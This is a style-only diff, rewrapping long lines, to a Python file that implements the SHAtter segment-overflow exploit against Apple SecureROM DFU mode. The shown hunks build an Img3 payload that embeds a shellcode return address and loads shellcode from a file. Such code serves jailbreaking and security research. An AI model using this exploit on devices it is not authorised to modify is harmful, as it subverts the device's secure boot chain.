@@ -1,4 +1,5 @@
-# Credit: This file is based on SHAtter exploit (segment overflow) by posixninja and pod2g.
+# Credit: This file is based on SHAtter exploit (segment overflow) by
+# posixninja and pod2g.
 
 import struct
 import sys
@@ -10,8 +11,17 @@ import dfu
 def generate_payload():
     shellcode_address = 0x8402F198 + 1
     data = struct.pack('<40sI', '\xF0' * 40, shellcode_address)
-    tags = data + struct.pack('<4s2I4s2I', 'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
-    header = struct.pack('<4s3I4s', 'Img3'[::-1], 20 + len(tags), len(tags), len(data), 'ibss'[::-1])
+    tags = data + struct.pack('<4s2I4s2I',
+                              'SHSH'[::-1], 12, 0, 'CERT'[::-1], 12, 0)
+    header = struct.pack(
+        '<4s3I4s',
+        'Img3'[
+            ::-1],
+        20 + len(tags),
+        len(tags),
+        len(data),
+        'ibss'[
+            ::-1])
     with open('bin/SHAtter-shellcode.bin', 'rb') as f:
         shellcode = f.read()
     assert len(shellcode) <= 1024
@@ -34,7 +44,8 @@ def exploit():
 
     if 'SRTG:[iBoot-574.4]' not in device.serial_number:
         print('ERROR: CPID is compatible, but serial number string does not match.')
-        print('Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
+        print(
+            'Make sure device is in SecureROM DFU Mode and not LLB/iBSS DFU Mode. Exiting.')
         sys.exit(1)
 
     dfu.reset_counters(device)
